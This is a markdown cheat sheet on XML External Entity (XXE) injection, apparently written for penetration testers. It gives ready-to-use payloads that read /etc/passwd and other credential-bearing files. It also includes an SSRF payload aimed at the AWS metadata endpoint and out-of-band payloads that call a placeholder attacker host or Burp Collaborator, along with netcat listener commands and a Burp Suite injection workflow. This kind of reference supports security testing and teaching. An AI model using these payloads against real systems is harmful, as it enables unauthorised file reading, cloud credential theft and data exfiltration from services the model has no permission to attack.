# XXE — XML EXTERNAL ENTITY INJECTION

## Core Concept
XML parsers process external entity references in user-controlled XML input.
Attackers can read local files, probe internal services (SSRF), or exfiltrate data.

## Classic XXE — File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

Common file targets:
```
/etc/passwd
/etc/hosts
/proc/self/environ
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
```

## SSRF via XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

Use to probe internal services (AWS metadata, internal APIs).

## Blind / Out-of-Band XXE

When no output is reflected in the response:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-IP/xxe-test">
]>
<root><data>&xxe;</data></root>
```

Listener:
```bash
$ nc -nvlp 80
$ python3 -m http.server 80
```

DNS-based (Burp Collaborator):
```xml
<!ENTITY xxe SYSTEM "http://YOUR-SUBDOMAIN.burpcollaborator.net/">
```

## Where to Look

- Any endpoint that accepts XML input
- SOAP web services
- File uploads (SVG, DOCX, XLSX — all XML-based)
- Content-Type: `application/xml` or `text/xml`
- JSON endpoints that also accept XML (change Content-Type header)

## Burp Suite Workflow
1. Intercept request with XML body
2. Send to **Repeater**
3. Add DOCTYPE + entity declaration before root element
4. Reference entity in a field that gets reflected in the response
5. No reflection → use OOB technique with listener

## Resources
- https://portswigger.net/web-security/xxe
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
